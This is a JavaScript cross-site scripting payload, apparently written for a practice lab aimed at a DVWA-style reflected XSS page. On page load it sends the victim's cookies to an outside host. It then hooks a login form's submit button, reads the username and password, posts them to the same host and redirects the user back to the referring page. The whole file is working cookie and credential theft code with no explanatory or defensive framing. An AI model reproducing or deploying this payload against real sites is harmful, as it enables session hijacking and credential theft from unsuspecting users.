console.log('xss-script.js loaded');

document.addEventListener('DOMContentLoaded', function() {
  console.log('DOM loaded, attaching event listener to submit-btn');

  // Initial cookie send
  fetch('https://data.estebanmf.space/cookies', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookies: document.cookie }),
    mode: 'no-cors'
  })
    .then(() => console.log('Cookie fetch sent'))
    .catch(e => console.error('Cookie fetch failed:', e));

  const submitBtn = document.getElementById('submit-btn');
  if (!submitBtn) {
    console.error('Submit button not found');
    return;
  }

  submitBtn.onclick = function() {
    console.log('Submit button clicked');
    let u = document.getElementById('u').value;
    let p = document.getElementById('p').value;
    if (!u || !p) {
      console.log('Validation failed: Empty fields');
      alert('Fill both fields.');
      return;
    }
    console.log('Sending credentials:', { username: u, password: p });
    fetch('https://data.estebanmf.space/credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p }),
      mode: 'no-cors'
    })
      .then(r => {
        console.log('Fetch response received');
        document.getElementById('msg').style.display = 'block';
        setTimeout(() => {
          console.log('Resetting inputs and redirecting');
          document.getElementById('u').value = '';
          document.getElementById('p').value = '';
          document.getElementById('msg').style.display = 'none';
          window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
        }, 2000);
      })
      .catch(e => {
        console.error('Credentials fetch failed:', e);
        alert('Error: ' + e.message);
      });
  };
});
